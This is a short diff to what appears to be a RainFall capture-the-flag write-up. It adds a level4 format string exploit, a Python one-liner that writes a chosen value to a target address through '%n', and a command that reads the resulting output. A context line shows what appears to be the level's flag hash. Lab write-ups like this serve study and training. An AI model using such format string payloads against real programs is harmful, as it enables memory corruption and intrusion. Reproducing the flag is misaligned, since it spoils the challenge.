@@ -48,3 +48,9 @@ cat /tmp/a | grep -o '[0-9a-z]\+'
 
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
+
+```
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4 > /tmp/a
+
+busybox tail -c 2000 /tmp/a
+```
